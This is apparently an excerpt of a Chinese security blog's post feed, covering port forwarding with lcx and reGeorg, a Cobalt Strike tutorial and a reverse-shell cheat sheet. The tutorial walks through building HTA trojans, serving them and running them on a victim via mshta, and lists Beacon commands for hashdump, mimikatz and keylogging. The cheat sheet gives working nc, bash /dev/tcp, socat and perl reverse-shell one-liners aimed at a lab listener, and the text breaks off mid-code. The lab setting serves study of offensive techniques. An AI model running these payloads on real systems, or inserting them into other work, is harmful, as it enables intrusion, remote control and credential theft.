]]></content>
      <tags>
        <tag>知识</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>端口转发</title>
    <url>/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/1.jpg" alt></p>
<h2 id="0x10-LCX"><a href="#0x10-LCX" class="headerlink" title="0x10 LCX"></a>0x10 LCX</h2><ol>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/1.png" alt></li>
<li><strong>环境：</strong></li>
<li>内网主机：windows 7 x64 RDP 3389 192.168.100.5</li>
<li>控制主机：Linux 192.168.100.4</li>
<li>服务器：windows server 2008 x64 192.168.100.3</li>
<li>lcx：windows版</li>
<li>portmap：linux版</li>
</ol>
<h2 id="0x11-lcx-exe内网本地端口转发"><a href="#0x11-lcx-exe内网本地端口转发" class="headerlink" title="0x11 lcx.exe内网本地端口转发"></a>0x11 lcx.exe内网本地端口转发</h2><ol>
<li>原理：内网主机本地实现端口转发，将3389端口转发给防火墙允许的端口12345（或忽略的端口），控制主机访问端口12345实现对3389端口进行访问。</li>
<li><strong>测试：</strong></li>
<li>默认访问3389：rdesktop 192.168.100.5:3389</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/2.png" alt></li>
<li>防火墙禁止3389入站</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/3.png" alt></li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/4.png" alt></li>
<li>再次访问，访问失败</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/5.png" alt></li>
<li>lcx本地转发3389-&gt;12345</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/6.png" alt></li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/7.png" alt></li>
</ol>
<h2 id="0x12-lcx-exe内网端口转发"><a href="#0x12-lcx-exe内网端口转发" class="headerlink" title="0x12 lcx.exe内网端口转发"></a>0x12 lcx.exe内网端口转发</h2><ol>
<li>原理：内网主机已阻止访问3389端口，将本地3389端口转发给服务器的13389端口，服务器将来自13389端口的请求转发给23389端口，服务器访问23389即可访问内网主机的3389端口</li>
<li><strong>测试：</strong></li>
<li>访问3389端口，上面已设置阻止访问</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/8.png" alt></li>
<li>内网主机：lcx.exe -slave 192.168.100.3 13389 127.0.0.1 3389</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/9.png" alt></li>
<li>服务器：lcx.exe -listen 13389 23389</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/10.png" alt></li>
</ol>
<h2 id="0x20-NC反弹shell"><a href="#0x20-NC反弹shell" class="headerlink" title="0x20 NC反弹shell"></a>0x20 NC反弹shell</h2><ol>
<li>控制主机：192.168.100.4</li>
<li>服务器：192.168.100.5</li>
<li>控制主机监听端口：nc -lvp 4444</li>
<li>服务器反弹一个cmd终端：nc -t -e cmd.exe 192.168.100.4 4444</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/18.png" alt></li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/19.png" alt></li>
</ol>
<h2 id="0x30-reGeorg"><a href="#0x30-reGeorg" class="headerlink" title="0x30 reGeorg"></a>0x30 <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a></h2><ol>
<li><strong>环境：</strong></li>
<li>控制主机 192.168.100.1</li>
<li>服务器 192.168.100.4，192.168.100.5</li>
<li>原理：上传服务器可解析的脚本，服务器成功解析后，本地主机监听指定端口通过http/https隧道转发命令到服务器，建立一个socks协议代理进行内网穿透，服务器必须支持aspx/php/jsp等中的一种。</li>
<li>reGeorg分为客户端与服务端，服务端有php/aspx/jsp/js等多个版本，客户端由Python2编写。</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/11.png" alt></li>
<li>上传服务器能解析的脚本（这里是tunnel.nosocket.php）</li>
<li>python reGeorgSocksProxy.py -p 8888 -u <a href="http://192.168.100.5/tunnel.nosocket.php" target="_blank" rel="noopener">http://192.168.100.5/tunnel.nosocket.php</a></li>
<li>关键字：Georg says, ‘All seems fine’，说明隧道成功建立</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/12.png" alt></li>
<li>同样，上传脚本后，通过浏览器访问也可验证代理成功</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/13.png" alt></li>
<li>结合Proxifier代理工具使用</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/14.png" alt></li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/15.png" alt></li>
<li>Direct：不经过代理，Proxy SOCKS5 127.0.0.1：经过代理</li>
<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/16.png" alt></li>
<li></li>
</ol>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike</title>
    <url>/CobaltStrike/</url>
    <content><![CDATA[<h2 id="0x00-CobaltStrike"><a href="#0x00-CobaltStrike" class="headerlink" title="0x00 CobaltStrike"></a>0x00 <a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener">CobaltStrike</a></h2><ol>
<li>一款渗透测试工具，简称CS。</li>
<li>目录结构：</li>
<li><img src="/CobaltStrike/5.png" alt></li>
<li>agscript #扩展应用的脚本</li>
<li>c2lint #用于检查profile的错误异常</li>
<li>cobaltstrike #Linux客户端文件</li>
<li>cobaltstrike.auth #</li>
<li>cobaltstrike.exe #</li>
<li>cobaltstrike.jar #客户端程序</li>
<li>cobaltstrike.store #</li>
<li>license.pdf #许可证</li>
<li>logs #日志</li>
<li>peclone #</li>
<li>teamserver #服务端文件</li>
<li>teamserver_win.bat #windows服务端</li>
<li>third-party #第三方工具</li>
<li>update #（Linux）用于更新CS</li>
<li>update.jar #用于更新CS</li>
</ol>
<h2 id="0x10-Linux下启动CobaltStrike的服务器与客户端"><a href="#0x10-Linux下启动CobaltStrike的服务器与客户端" class="headerlink" title="0x10 Linux下启动CobaltStrike的服务器与客户端"></a>0x10 Linux下启动CobaltStrike的服务器与客户端</h2><ol>
<li>工具分服务端与客户端，关键文件：teamserver和cobaltstrike</li>
<li>服务端启动</li>
<li>./teamserver 当前主机的ip 密码 #<a href="https://github.com/ryanohoro/csbruter" target="_blank" rel="noopener">CS爆破脚本</a></li>
<li><img src="/CobaltStrike/1.png" alt></li>
<li>Linux本地客户端启动</li>
<li>./cobaltstrike（或者： java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar）</li>
<li>host即服务端的ip，port默认为50050,user随意，password就是前面teamserver启动设置的密码</li>
<li><img src="/CobaltStrike/2.png" alt></li>
<li>远程客户端启动</li>
<li><img src="/CobaltStrike/3.png" alt></li>
<li><img src="/CobaltStrike/4.png" alt></li>
<li><strong>注意</strong></li>
<li>50050是服务端默认端口，可以修改teamserver文件来修改端口</li>
<li><img src="/CobaltStrike/6.png" alt></li>
</ol>
<h2 id="0x20-各种参数"><a href="#0x20-各种参数" class="headerlink" title="0x20 各种参数"></a>0x20 各种参数</h2><h3 id="0x21-CobaltStrike"><a href="#0x21-CobaltStrike" class="headerlink" title="0x21 CobaltStrike"></a>0x21 CobaltStrike</h3><ol>
<li>New Connection   # 新建连接，支持连接多个服务器端</li>
<li>Preferences   # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</li>
<li>Visualization   # 主要展示输出结果的视图</li>
<li>VPN Interfaces   # 设置VPN接口</li>
<li>Listenrs   # 创建监听器</li>
<li>Script Manager   # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</li>
<li>Close   # 退出连接</li>
</ol>
<h3 id="0x22-View"><a href="#0x22-View" class="headerlink" title="0x22 View"></a>0x22 View</h3><ol>
<li>Applications   # 显示受害主机的应用信息</li>
<li>Credentials   # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</li>
<li>Downloads   # 查看已下载文件</li>
<li>Event Log   # 主机上线记录以及团队协作聊天记录</li>
<li>Keystrokes   # 查看键盘记录结果</li>
<li>Proxy Pivots   # 查看代理模块</li>
<li>Screenshots   # 查看所有屏幕截图</li>
<li>Script Console   # 加载第三方脚本以增强功能 </li>
<li>Targets   # 显示所有受害主机</li>
<li>Web Log    # 所有Web服务的日志</li>
</ol>
<h3 id="0x23-Attacks"><a href="#0x23-Attacks" class="headerlink" title="0x23 Attacks"></a>0x23 Attacks</h3><p><strong>Packages</strong></p>
<ol>
<li>HTML Application   # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</li>
<li>MS Office Macro   # 生成office宏病毒文件</li>
<li>Payload Generator   # 生成各种语言版本的payload</li>
<li>USB/CD AutoPlay   # 生成利用自动播放运行的木马文件</li>
<li>Windows Dropper   # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)</li>
<li>Windows Executable   # 生成可执行exe木马</li>
<li>Windows Executable(Stageless)   # 生成无状态的可执行exe木马</li>
</ol>
<p><strong>Web Drive-by</strong></p>
<ol>
<li>Manage   # 对开启的web服务进行管理</li>
<li>Clone Site   # 克隆网站，可以记录受害者提交的数据</li>
<li>Host File   # 提供文件下载，可以选择Mime类型</li>
<li>Scripted Web Delivery   # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery </li>
<li>Signed Applet Attack   # 使用java自签名的程序进行钓鱼攻击(该方法已过时)</li>
<li>Smart Applet Attack   # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)</li>
<li>System Profiler   # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</li>
</ol>
<p><strong>Spear Phish</strong>   # 鱼叉钓鱼邮件</p>
<h3 id="0x24-Reporting"><a href="#0x24-Reporting" class="headerlink" title="0x24 Reporting"></a>0x24 Reporting</h3><ol>
<li>Activity Report   # 活动报告</li>
<li>Hosts Report   # 主机报告</li>
<li>Indicators of Compromise   # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes</li>
<li>Sessions Report   # 会话报告</li>
<li>Social Engineering Report   # 社会工程报告：包括鱼叉钓鱼邮件及点击记录</li>
<li>Tactics, Techniques, and Procedures   # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略</li>
</ol>
<p><strong>Reset Data</strong>   # 重置数据<br><strong>Export Data</strong>   # 导出数据，导出.tsv文件格式</p>
<h3 id="0x25-Help"><a href="#0x25-Help" class="headerlink" title="0x25 Help"></a>0x25 Help</h3><ol>
<li>Homepage   # 官方主页</li>
<li>Support   # 技术支持</li>
<li>Arsenal   # 开发者</li>
<li>System information   # 版本信息</li>
<li>About   # 关于</li>
</ol>
<h3 id="0x26-各按钮快捷键"><a href="#0x26-各按钮快捷键" class="headerlink" title="0x26 各按钮快捷键"></a>0x26 各按钮快捷键</h3><p><img src="/CobaltStrike/7.png" alt></p>
<ol>
<li>新建连接</li>
<li>断开当前连接</li>
<li>监听器</li>
<li>改变视图为Pivot Graph(视图列表)</li>
<li>改变视图为Session Table(会话列表)</li>
<li>改变视图为Target Table(目标列表)</li>
<li>显示所有以获取的受害主机的凭证</li>
<li>查看已下载文件</li>
<li>查看键盘记录结果</li>
<li>查看屏幕截图</li>
<li>生成无状态的可执行exe木马</li>
<li>使用java自签名的程序进行钓鱼攻击</li>
<li>生成office宏病毒文件</li>
<li>为payload提供web服务以便下载和执行</li>
<li>提供文件下载，可以选择Mime类型</li>
<li>管理Cobalt Strike上运行的web服务</li>
<li>帮助</li>
<li>关于</li>
</ol>
<h2 id="0x30-基本使用"><a href="#0x30-基本使用" class="headerlink" title="0x30 基本使用"></a>0x30 基本使用</h2><h3 id="0x31-创建监听器"><a href="#0x31-创建监听器" class="headerlink" title="0x31 创建监听器"></a>0x31 创建监听器</h3><ol>
<li>Cobalt Strike——Listeners——Add</li>
<li><img src="/CobaltStrike/8.png" alt></li>
<li>共9个listener</li>
<li>windows/beacon_dns/reverse_dns_txt</li>
<li>windows/beacon_dns/reverse_http</li>
<li>windows/beacon_http/reverse_http</li>
<li>windows/beacon_https/reverse_https</li>
<li>windows/beacon_smb/bind_pipe</li>
<li>windows/foreign/reverse_dns_txt</li>
<li>windows/foreign/reverse_http</li>
<li>windows/foreign/reverse_https</li>
<li>windows/foreign/reverse_tcp</li>
<li>这里name随意，选windows/beacon_http/reverse_http，host默认，port为不在使用中的端口，save</li>
<li><img src="/CobaltStrike/9.png" alt></li>
<li>确定</li>
<li><img src="/CobaltStrike/10.png" alt></li>
<li>已建立监听，确定</li>
<li><img src="/CobaltStrike/11.png" alt></li>
</ol>
<h3 id="0x32-创建木马文件"><a href="#0x32-创建木马文件" class="headerlink" title="0x32 创建木马文件"></a>0x32 创建木马文件</h3><ol>
<li>Attacks——Packages——HTML Application——Listener选刚创建的监听名称test（如果没有则点Add新建监听器）——method这里选powershell——Generate</li>
<li><img src="/CobaltStrike/12.png" alt></li>
<li><img src="/CobaltStrike/13.png" alt></li>
<li>自选保存路径</li>
<li><img src="/CobaltStrike/14.png" alt></li>
</ol>
<h3 id="0x33-开启web服务"><a href="#0x33-开启web服务" class="headerlink" title="0x33 开启web服务"></a>0x33 开启web服务</h3><ol>
<li>Attacks——Web Drive-by——Host File</li>
<li><img src="/CobaltStrike/15.png" alt></li>
<li>File选刚生成的evil.hta——其他默认，Launch</li>
<li><img src="/CobaltStrike/16.png" alt></li>
<li>生成了下载链接</li>
<li><img src="/CobaltStrike/17.png" alt></li>
</ol>
<h3 id="0x34-运行木马"><a href="#0x34-运行木马" class="headerlink" title="0x34 运行木马"></a>0x34 运行木马</h3><ol>
<li>被攻击机运行mshta命令：mshta <a href="http://192.168.100.4:80/download/file.ext（mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。）" target="_blank" rel="noopener">http://192.168.100.4:80/download/file.ext（mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。）</a></li>
<li><img src="/CobaltStrike/18.png" alt></li>
<li>查看CS，已经有显示被攻击机在线</li>
<li><img src="/CobaltStrike/19.png" alt></li>
<li>右击——Interact，就可以进行交互</li>
<li><img src="/CobaltStrike/20.png" alt></li>
<li>sleep 5 #因为默认60秒回传一次，这里设置为5秒（可以设置为0秒，真实环境中，太快容易被发现）</li>
<li><img src="/CobaltStrike/21.png" alt></li>
</ol>
<h3 id="0x35-导出报告"><a href="#0x35-导出报告" class="headerlink" title="0x35 导出报告"></a>0x35 导出报告</h3><ol>
<li>Reporting——Activity Report——默认PDF格式</li>
<li><img src="/CobaltStrike/22.png" alt></li>
<li><img src="/CobaltStrike/23.png" alt></li>
</ol>
<h2 id="0x40-Beacon"><a href="#0x40-Beacon" class="headerlink" title="0x40 Beacon"></a>0x40 Beacon</h2><h3 id="0x41-查看帮助"><a href="#0x41-查看帮助" class="headerlink" title="0x41 查看帮助"></a>0x41 查看帮助</h3><pre><code>beacon&gt; help

Beacon Commands
===============

    Command                   Description
    -------                   -----------
    argue                     Spoof arguments for matching processes 进程参数欺骗
    blockdlls                 Block non-Microsoft DLLs in child processes 在子进程中阻止非Microsoft的DLLs文件
    browserpivot              Setup a browser pivot session 注入被攻击者浏览器进程
    bypassuac                 Spawn a session in a high integrity process 绕过UAC
    cancel                    Cancel a download that&#39;s in-progress 取消正在进行的下载
    cd                        Change directory 切换目录
    checkin                   Call home and post data 强制让被控端回连一次
    clear                     Clear beacon queue 清除beacon内部的任务队列
    connect                   Connect to a Beacon peer over TCP 通过TCP连接到Beacon
    covertvpn                 Deploy Covert VPN client 部署Covert VPN客户端
    cp                        Copy a file 复制文件
    dcsync                    Extract a password hash from a DC 从DC中提取密码哈希
    desktop                   View and interact with target&#39;s desktop 远程VNC
    dllinject                 Inject a Reflective DLL into a process 反射DLL注入进程
    dllload                   Load DLL into a process with LoadLibrary() 使用LoadLibrary将DLL加载到进程中
    download                  Download a file 下载文件
    downloads                 Lists file downloads in progress 列出正在进行的文件下载
    drives                    List drives on target 列出目标盘符
    elevate                   Try to elevate privileges 尝试提权
    execute                   Execute a program on target (no output) 在目标上执行程序(无输出)
    execute-assembly          Execute a local .NET program in-memory on target 在目标上内存中执行本地.NET程序
    exit                      Terminate the beacon session 退出beacon
    getprivs                  Enable system privileges on current token 对当前令牌启用系统权限
    getsystem                 Attempt to get SYSTEM 尝试获取SYSTEM权限
    getuid                    Get User ID 获取用户ID
    hashdump                  Dump password hashes 转储密码哈希值
    help                      Help menu 帮助
    inject                    Spawn a session in a specific process 在特定进程中生成会话
    jobkill                   Kill a long-running post-exploitation task 杀死一个后台任务
    jobs                      List long-running post-exploitation tasks 列出后台任务
    kerberos_ccache_use       Apply kerberos ticket from cache to this session 从ccache文件中导入票据应用于此会话
    kerberos_ticket_purge     Purge kerberos tickets from this session 清除当前会话的票据
    kerberos_ticket_use       Apply kerberos ticket to this session 从ticket文件中导入票据应用于此会话
    keylogger                 Inject a keystroke logger into a process 键盘记录
    kill                      Kill a process 结束进程
    link                      Connect to a Beacon peer over a named pipe 通过命名管道连接到Beacon
    logonpasswords            Dump credentials and hashes with mimikatz 使用mimikatz转储凭据和哈希值
    ls                        List files 列出文件
    make_token                Create a token to pass credentials 创建令牌以传递凭据
    mimikatz                  Runs a mimikatz command 运行mimikatz
    mkdir                     Make a directory 创建一个目录
    mode dns                  Use DNS A as data channel (DNS beacon only) 使用DNS A作为通信通道(仅限DNS beacon)
    mode dns-txt              Use DNS TXT as data channel (DNS beacon only) 使用DNS TXT作为通信通道(仅限D beacon)
    mode dns6                 Use DNS AAAA as data channel (DNS beacon only) 使用DNS AAAA作为通信通道(仅限DNS beacon)
    mode http                 Use HTTP as data channel 使用HTTP作为通信通道
    mv                        Move a file 移动文件
    net                       Network and host enumeration tool net命令
    note                      Assign a note to this Beacon 给当前目标机器备注
    portscan                  Scan a network for open services 进行端口扫描
    powerpick                 Execute a command via Unmanaged PowerShell 通过Unmanaged PowerShell执行命令
    powershell                Execute a command via powershell.exe 通过powershell.exe执行命令
    powershell-import         Import a powershell script 导入powershell脚本
    ppid                      Set parent PID for spawned post-ex jobs 为生成的post-ex任务设置父PID
    ps                        Show process list 显示进程列表
    psexec                    Use a service to spawn a session on a host 使用服务在主机上生成会话
    psexec_psh                Use PowerShell to spawn a session on a host 使用PowerShell在主机上生成会话
    psinject                  Execute PowerShell command in specific process 在特定进程中执行PowerShell命令
    pth                       Pass-the-hash using Mimikatz 使用Mimikatz进行传递哈希
    pwd                       Print current directory 当前目录位置
    reg                       Query the registry 查询注册表
    rev2self                  Revert to original token 恢复原始令牌
    rm                        Remove a file or folder 删除文件或文件夹
    rportfwd                  Setup a reverse port forward 端口转发
    run                       Execute a program on target (returns output) 在目标上执行程序(返回输出)
    runas                     Execute a program as another user  以另一个用户权限执行程序
    runasadmin                Execute a program in a high-integrity context 在高权限下执行程序
    runu                      Execute a program under another PID 在另一个PID下执行程序
    screenshot                Ta 将shellcode注入进程ke a screenshot 屏幕截图
    setenv                    Set an environment variable  设置环境变量
    shell                     Execute a command via cmd.exe cmd执行命令
    shinject                  Inject shellcode into a process 将shellcode注入进程
    shspawn                   Spawn process and inject shellcode into it 生成进程并将shellcode注入其中
    sleep                     Set beacon sleep time 设置睡眠延迟时间
    socks                     Start SOCKS4a server to relay traffic 启动SOCKS4代理
    socks stop                Stop SOCKS4a server 停止SOCKS4
    spawn                     Spawn a session 生成一个会话
    spawnas                   Spawn a session as another user 以其他用户身份生成会话
    spawnto                   Set executable to spawn processes into 将可执行程序注入进程
    spawnu                    Spawn a session under another PID 在另一个PID下生成会话
    ssh                       Use SSH to spawn an SSH session on a host 使用ssh连接远程主机
    ssh-key                   Use SSH to spawn an SSH session on a host 使用密钥连接远程主机
    steal_token               Steal access token from a process 从进程中窃取令牌
    timestomp                 Apply timestamps from one file to another 将一个文件时间戳应用到另一个文件
    unlink                    Disconnect from parent Beacon 断开与Beacon的连接
    upload                    Upload a file 上传文件
    wdigest                   Dump plaintext credentials with mimikatz 使用mimikatz转储明文凭据
    winrm                     Use WinRM to spawn a session on a host 使用WinRM在主机上生成会话
    wmi                       Use WMI to spawn a session on a host 使用WMI在主机上生成会话</code></pre><h3 id="0x42-具体命令的帮助信息"><a href="#0x42-具体命令的帮助信息" class="headerlink" title="0x42 具体命令的帮助信息"></a>0x42 具体命令的帮助信息</h3><ol>
<li>help shell</li>
<li><img src="/CobaltStrike/24.png" alt></li>
<li></li>
<li><strong>hashdump</strong> #获取hash</li>
<li><img src="/CobaltStrike/37.png" alt></li>
<li></li>
<li>logonpasswords</li>
<li><img src="/CobaltStrike/38.png" alt></li>
<li><img src="/CobaltStrike/39.png" alt></li>
<li>同样可按键</li>
<li><img src="/CobaltStrike/40.png" alt></li>
<li></li>
<li><strong>其他命令</strong></li>
<li>pwd</li>
<li>getuid</li>
<li>ls</li>
<li>net user</li>
<li>net localgroup</li>
<li>net logons</li>
<li>screenshot #截图，保存到服务端日志文件夹里</li>
<li><img src="/CobaltStrike/41.png" alt></li>
<li>shell ipconfig</li>
<li>ps</li>
<li>keylogger pid</li>
<li>Keystrokes #查看键盘记录</li>
<li>shell dir</li>
<li>elevate #查看模块</li>
<li>elevate ms15-051 http beacon #加载模块</li>
</ol>
<h3 id="0x43-MSF"><a href="#0x43-MSF" class="headerlink" title="0x43 MSF"></a>0x43 MSF</h3><ol>
<li>新建监听器</li>
<li><img src="/CobaltStrike/46.png" alt> </li>
<li><img src="/CobaltStrike/47.png" alt></li>
<li>选择刚新建的监听器</li>
<li><img src="/CobaltStrike/48.png" alt></li>
<li>启动MSF，并设置监听，当前面选choose时，msf就获取到session</li>
<li><img src="/CobaltStrike/49.png" alt></li>
</ol>
<h2 id="0x50-browserpivot"><a href="#0x50-browserpivot" class="headerlink" title="0x50 browserpivot"></a>0x50 browserpivot</h2><ol>
<li>Setup a browser pivot session 注入被攻击者浏览器进程</li>
<li>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。</li>
<li>ps #查看进程</li>
<li><img src="/CobaltStrike/25.png" alt></li>
<li>也可以通过图形界面注入，右击——Explore——Browser Pivot</li>
<li><img src="/CobaltStrike/26.png" alt></li>
<li><img src="/CobaltStrike/27.png" alt></li>
<li>然后浏览器设置代理访问</li>
<li><img src="/CobaltStrike/28.png" alt></li>
<li><img src="/CobaltStrike/29.png" alt></li>
</ol>
<h2 id="0x60-Socks代理"><a href="#0x60-Socks代理" class="headerlink" title="0x60 Socks代理"></a>0x60 Socks代理</h2><ol>
<li>开启代理，内网渗透</li>
<li>同样两种方法，命令或右击——Pivoting——SOCKS Server</li>
<li>命令：socks 6666</li>
<li><img src="/CobaltStrike/30.png" alt></li>
<li>然后编辑vim /etc/proxychains.conf，在文件末尾添加socks4代理</li>
<li><img src="/CobaltStrike/31.png" alt></li>
<li>使用proxychains扫内网：proxychains nmap -sP 192.168.100.0/24</li>
<li><img src="/CobaltStrike/32.png" alt></li>
<li>还可以把MSF带进目标内网View——Proxy Pivots——选择Socks4a Proxy——点击Tunnel——setg Proxies socks4:127.0.0.1:6666</li>
<li><img src="/CobaltStrike/33.png" alt></li>
<li>setg Proxies socks4:127.0.0.1:6666</li>
<li><img src="/CobaltStrike/34.png" alt></li>
<li>beacon&gt;socks stop #关闭sock</li>
</ol>
<h2 id="0x70-powershell-import"><a href="#0x70-powershell-import" class="headerlink" title="0x70 powershell-import"></a>0x70 powershell-import</h2><ol>
<li>可以导入各种powershell渗透框架：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a>、<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a></li>
<li>beacon&gt;powershell-import #导入ps脚本，来自<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a></li>
<li><img src="/CobaltStrike/35.png" alt></li>
<li><img src="/CobaltStrike/36.png" alt></li>
<li>详细命令可查看cat Powerpreter.psm1 | grep function</li>
</ol>
<h2 id="0x80-dll文件或ps文件"><a href="#0x80-dll文件或ps文件" class="headerlink" title="0x80 dll文件或ps文件"></a>0x80 dll文件或ps文件</h2><ol>
<li>Attacks——Packages——windows Executable(S)</li>
<li><img src="/CobaltStrike/43.png" alt></li>
<li><img src="/CobaltStrike/42.png" alt></li>
<li>上传到被攻击机：upload /root/cobaltstrike3.14/backdoors/beacon.dll</li>
<li><img src="/CobaltStrike/44.png" alt></li>
<li>shell dir</li>
<li><img src="/CobaltStrike/45.png" alt></li>
<li>在被攻击机上执行：regsvr32 beacon.dll</li>
<li></li>
<li>Attacks——Packages——windows Executable(S)</li>
<li><img src="/CobaltStrike/50.png" alt></li>
<li>上传到被攻击机：upload /root/cobaltstrike3.14/backdoors/beacon.ps1</li>
<li>在被攻击机上执行：.\beacon.ps1</li>
<li>执行regsvr32 beacon.dll还是posershell beacon.ps1之后，会话列表就多了一条多*的主机</li>
<li><img src="/CobaltStrike/51.png" alt></li>
</ol>
<h2 id="0x90-内网渗透"><a href="#0x90-内网渗透" class="headerlink" title="0x90 内网渗透"></a>0x90 内网渗透</h2><ol>
<li>bypass UAC</li>
<li><img src="/CobaltStrike/52.png" alt></li>
</ol>
<h2 id="0xA0-各种扫描"><a href="#0xA0-各种扫描" class="headerlink" title="0xA0 各种扫描"></a>0xA0 各种扫描</h2><h3 id="0xA1-存活主机扫描"><a href="#0xA1-存活主机扫描" class="headerlink" title="0xA1 存活主机扫描"></a>0xA1 存活主机扫描</h3><ol>
<li>右击会话——Explore——net view</li>
<li><img src="/CobaltStrike/55.png" alt></li>
</ol>
<h3 id="0xA2-端口扫描"><a href="#0xA2-端口扫描" class="headerlink" title="0xA2 端口扫描"></a>0xA2 端口扫描</h3><ol>
<li>右击会话——Explore——port scan</li>
<li><img src="/CobaltStrike/53.png" alt></li>
<li><img src="/CobaltStrike/54.png" alt></li>
<li>可能没扫到~</li>
<li><img src="/CobaltStrike/56.png" alt></li>
<li>执行扫描端口命令：beacon&gt; portscan 192.168.100.8 1-10000 icmp 1024</li>
<li><img src="/CobaltStrike/57.png" alt></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/102725129</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>shell</title>
    <url>/shell/</url>
    <content><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol>
<li>留言</li>
</ol>
<h2 id="0x10-reverse-shell"><a href="#0x10-reverse-shell" class="headerlink" title="0x10 reverse shell"></a>0x10 reverse shell</h2><ol>
<li>localhost：192.168.100.4</li>
<li>remotehost：192.168.100.27</li>
<li><h3 id="0x11-NetCat"><a href="#0x11-NetCat" class="headerlink" title="0x11 NetCat"></a>0x11 NetCat</h3></li>
<li>nc -e /bin/sh 192.168.100.4 8888</li>
<li>nc.traditional -e /bin/bash 192.168.100.4 8888</li>
<li>nc -c bash 192.168.100.4 8888</li>
<li>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.100.4 8888 &gt;/tmp/f</li>
</ol>
<h3 id="0x12-TCP-UDP"><a href="#0x12-TCP-UDP" class="headerlink" title="0x12 TCP/UDP"></a>0x12 TCP/UDP</h3><p><strong>TCP</strong></p>
<ol>
<li>nc -lvp 8888</li>
<li>bash -i &gt;&amp; /dev/tcp/192.168.100.4/8888 0&gt;&amp;1 #在remotehost上执行，向localhost反弹shell</li>
<li>sh -i &gt;&amp; /dev/tcp/192.168.100.4/8888 0&gt;&amp;1</li>
<li>0&lt;&11;exec 11&lt;&gt;/dev/tcp/192.168.100.4/8888;sh &lt;&amp;11 &gt;&amp;11 2&gt;&amp;11 #11随机数，大于2就行</li>
</ol>
<p><strong>UDP</strong></p>
<ol>
<li>nc -ulvp 8888</li>
<li>sh -i &gt;&amp; /dev/udp/192.168.100.4/8888 0&gt;&amp;1 </li>
<li></li>
<li><strong>socat</strong></li>
<li>socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:192.168.100.4:8888</li>
</ol>
<h3 id="0x13-perl"><a href="#0x13-perl" class="headerlink" title="0x13 perl"></a>0x13 perl</h3><ol start="10">
<li>perl -e ‘use Socket;$h=”192.168.100.4”;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($h)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<pre><code>$h=&quot;192.168.100.4&quot;;
$p=8888;
socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));
if(connect(S,sockaddr_in($p,inet_aton($h)))){
open(STDIN,&quot;&gt;&amp;S&quot;);
